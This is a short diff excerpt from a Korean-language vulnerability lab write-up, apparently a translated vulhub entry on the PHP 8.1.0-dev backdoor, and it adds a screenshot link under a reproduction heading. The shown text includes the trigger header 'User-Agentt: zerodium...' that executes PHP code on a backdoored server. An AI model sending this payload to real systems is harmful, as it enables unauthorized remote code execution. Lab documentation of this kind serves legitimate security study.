@@ -19,5 +19,6 @@ php 버전 8.1.0-dev인 서버에 백도어가 있는 경우 공격자는 User_A
 #### 취약성 재현
 - - -
 다음 요청을 보내 코드를 실행합니다.
+!(https://github.com/azs3983/whitehat-school-vulhub/blob/%EC%9C%A4%EC%88%98%EB%AF%BC/azs3980%5D-php-8.1---backdoor-%ED%95%9C%EA%B8%80%ED%99%94-%EC%9E%91%EC%97%85/php/8.1-backdoor/1.PNG)
 
 `User-Agentt : zerodiumvar_dump(233*233);`
